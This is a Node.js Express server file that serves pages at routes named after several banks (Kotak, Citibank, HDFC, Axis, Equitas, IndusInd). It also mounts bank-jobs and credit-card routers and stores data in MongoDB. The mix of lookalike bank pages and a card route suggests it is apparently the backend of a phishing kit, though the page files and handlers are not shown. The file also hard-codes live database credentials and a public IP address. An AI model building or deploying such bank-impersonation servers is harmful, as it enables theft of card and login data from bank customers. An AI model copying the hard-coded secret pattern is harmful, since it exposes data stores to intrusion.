const express = require('express')
const app = express()
const port = 3000
const cors = require('cors');
const BankJobs = require('./Routes/bankjobs');
const CreditCard = require('./Routes/cc');
var bodyParser = require('body-parser');
const mongoose = require('mongoose');

app.use(cors());

// parse application/json, basically parse incoming Request Object as a JSON Object 
app.use(bodyParser.json());
// parse application/x-www-form-urlencoded, basically can only parse incoming Request Object if strings or arrays
//app.use(bodyParser.urlencoded({ extended: false }));
// combines the 2 above, then you can parse incoming Request Object if object, with nested objects, or generally any type.
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/bank',BankJobs)
app.use('/cc',CreditCard)
app.get('/kotak', (req, res) => {
  res.sendFile(__dirname + "/View/index.html");
})
app.get('/citibank', (req, res) => {
  res.sendFile(__dirname + "/View/cc/citibank.html");
})


app.get('/kotak', (req, res) => {
  res.sendFile(__dirname + "/View/index.html");
})
app.get('/hdfc', (req, res) => {
  res.sendFile(__dirname + "/View/hdfc.html");
})
app.get('/axis', (req, res) => {
  res.sendFile(__dirname + "/View/axis.html");
})
app.get('/equitas', (req, res) => {
  res.sendFile(__dirname + "/View/equitas.html");
})
app.get('/indusind', (req, res) => {
  res.sendFile(__dirname + "/View/indusind.html");
})
mongoose.connect("mongodb://pura:123456@15.207.216.233/pura?authSource=pura")
mongoose.Promise = global.Promise
const db = mongoose.connection
db.on('error', console.error)
db.once('open', ()=>{
    console.log('connected to mongodb server')
})
app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})


